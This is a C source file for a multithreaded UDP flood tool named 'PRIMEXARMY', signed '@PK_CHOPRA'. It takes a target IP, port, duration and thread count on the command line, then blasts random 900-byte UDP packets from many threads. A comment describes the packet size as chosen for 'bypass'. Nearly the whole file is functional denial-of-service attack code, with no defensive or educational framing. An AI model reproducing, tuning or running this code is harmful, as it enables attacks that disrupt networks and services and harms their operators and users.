#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <unistd.h>
#include <time.h>

// --- SETTINGS ---
#define PACKET_SIZE 900 // Balanced packet size for bypass
#define DEFAULT_THREADS 500

struct target_data {
    char *ip;
    int port;
    int duration;
};

// Function to generate random payload
void generate_payload(char *data, int size) {
    static const char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    for (int i = 0; i < size; i++) {
        data[i] = charset[rand() % (sizeof(charset) - 1)];
    }
}

// Attack Worker Thread
void *attack_thread(void *arg) {
    struct target_data *data = (struct target_data *)arg;
    int sock;
    struct sockaddr_in server_addr;
    char packet[PACKET_SIZE];

    // Socket Creation
    if ((sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) < 0) {
        pthread_exit(NULL);
    }

    // Server Configuration
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(data->port);
    server_addr.sin_addr.s_addr = inet_addr(data->ip);

    time_t start_time = time(NULL);
    while (time(NULL) - start_time < data->duration) {
        generate_payload(packet, PACKET_SIZE);
        
        // Sending packets at high speed
        sendto(sock, packet, PACKET_SIZE, 0, (struct sockaddr *)&server_addr, sizeof(server_addr));
    }

    close(sock);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc != 5) {
        printf("\033[91mUsage: ./PRIMEXARMY <IP> <PORT> <TIME> <THREADS>\033[0m\n");
        return 1;
    }

    char *ip = argv[1];
    int port = atoi(argv[2]);
    int duration = atoi(argv[3]);
    int threads_count = atoi(argv[4]);

    printf("\033[92m[+] PRIMEXARMY ATTACK INITIALIZED\033[0m\n");
    printf("\033[94m[+] Target: %s:%d | Threads: %d | Time: %ds\033[0m\n", ip, port, threads_count, duration);

    pthread_t threads[threads_count];
    struct target_data data = {ip, port, duration};

    

    for (int i = 0; i < threads_count; i++) {
        if (pthread_create(&threads[i], NULL, attack_thread, &data) != 0) {
            perror("Thread creation failed");
        }
    }

    for (int i = 0; i < threads_count; i++) {
        pthread_join(threads[i], NULL);
    }

    printf("\n\033[92m[+] Attack Finished. @PK_CHOPRA\033[0m\n");
    return 0;
}